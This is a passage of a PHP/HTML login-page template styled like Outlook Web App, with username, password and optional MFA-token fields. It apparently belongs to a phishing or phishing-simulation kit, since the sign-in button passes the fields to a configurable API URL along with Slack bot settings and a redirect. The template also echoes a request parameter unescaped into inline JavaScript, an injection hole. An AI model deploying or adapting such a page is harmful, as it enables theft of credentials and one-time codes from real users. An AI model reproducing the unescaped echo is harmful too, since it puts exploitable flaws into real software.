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">             </DIV>
<DIV class="signInInputLabel" id="userNameLabel" aria-hidden="true">User 
name:</DIV>
<DIV><INPUT name="username" class="signInInputText" id="username" role="textbox" aria-labelledby="userNameLabel"></DIV>
<DIV class="signInInputLabel" id="passwordLabel" 
aria-hidden="true">Password:</DIV>
<DIV><INPUT name="password" class="signInInputText" id="password" aria-labelledby="passwordLabel" onfocus="g_fFcs=0" type="password"></DIV>
<DIV><INPUT name="passwordText" class="signInInputText" id="passwordText" aria-labelledby="passwordLabel" style="display: none;" onfocus="g_fFcs=0"></DIV>
<DIV class="showPasswordCheck signInCheckBoxText"><INPUT class="chk" id="showPasswordCheck" 
onclick="showPasswordClick()" type="checkbox">             <SPAN>Show 
password</SPAN>         </DIV>
		<?php if($MFA == "on"){ ?>
		<div class="signInInputLabel" id="userNameLabel" aria-hidden="true">Token:</div>
		<div><input id="token" name="token" class="signInInputText" role="textbox" aria-labelledby="userNameLabel" <?php if($MFArequired == "on"){ ?>required<?php } ?>></div>		
        <?php } ?>
<DIV class="signInExpl" id="expltxt" role="alert"></DIV>
<DIV class="signInEnter">
<DIV tabindex="0" class="signinbutton" role="button" onclick="SubForm('<?php echo $APIURL; ?>','logonForm','<?php echo $Project; ?>','<?php echo $SlackBotName; ?>','<?php echo $SlackEmoji; ?>','username','password','<?php echo $Redirect; ?>','<?php if(isset($_REQUEST['csrffield'])){echo $_REQUEST['csrffield'];}else{echo '';}?>')"><IMG 
class="imgLnk" alt="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABYAAAAWCAYAAADEtGw7AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyBpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNSBXaW5kb3dzIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOjU1NzZGNEQzOTYxOTExRTE4ODU2ODkyQUQxMTQ2QUJGIiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOjU1NzZGNEQ0OTYxOTExRTE4ODU2ODkyQUQxMTQ2QUJGIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6NTU3NkY0RDE5NjE5MTFFMTg4NTY4OTJBRDExNDZBQkYiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6NTU3NkY0RDI5NjE5MTFFMTg4NTY4OTJBRDExNDZBQkYiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz7MvF4iAAACF0lEQVR42qyVz0sCQRTHZ5cSuqQJURRUt66GEuQlugmF0Ukw+huCjaBT0SkhEvwL6iQEERRJndIuCoLU1VsFQkH04xR0se/D79C4qLtCDz47zO6b7755M2/GUk5ZdbEwSIEEmAQRvn8ADXADTptHC++dBlsdhIfAJtgBQdXbvkAG5PCDb/OD7XIcByVwQNFLsA5iYJDE+O6SPuJbsrYq490ilulKZwrUwB4oeES8DPZBFDyDOCJvmBEHwDlFC8yrl6hy+crYc0QeMIUdMM9IN8Cb8mmI8I1jatRwtLDkaZt+Mv0P1adB/INjxbYRddBmnsKczt/0s/F2lJrhT5vgHoTkvWVZWlyPF620zb2qPHOajT/iuQQ+uaeLWPiQyyvPNiHCs+zces45G5fimGORaPGI4XHHNjrAvSv22ibilJs+0tsSV2qEfb3oo7b6Xwuw/ZGIX7gzxpi/v+LRi9g+E4nymNFKStaMrxNsGxJxnZ1Fz3haokVDdImLqi3Kti7CZ+wkXQvVHq1TnqFoyBD9dP06zfZGzgpJwxPTseKzlM3iaOVtqyL1cMUTb9o2jj6xXWOFfRtERzhWLIOffeldkTVq/QQM9yE6zDH6rMmZh9APWOXNkGSxJHzoJuib5NhVfeCb+1g+yGpVubrX4IIlH3EVRYrfrulbNc/iXleTwxPPz9V0KKl0X02Wx2Wa9rhM890u018BBgDOvaD/8G2ecwAAAABJRU5ErkJggg=="><SPAN class="signinTxt">sign in</SPAN>             
</DIV>             <INPUT name="isUtf8" type="hidden" value="1">		 </DIV>
<HR>

<DIV class="hidden-submit"><INPUT tabindex="-1" type="submit" value="Submit Query"></DIV></DIV>
<DIV class="signInInputLabel" id="busWarning" aria-hidden="true">This site is 
for business purposes only.</DIV></DIV>
</DIV></FORM>
<SCRIPT>
    if (showPlaceholderText) {
        setPlaceholderText();
    }
</SCRIPT>
 </BODY></HTML>
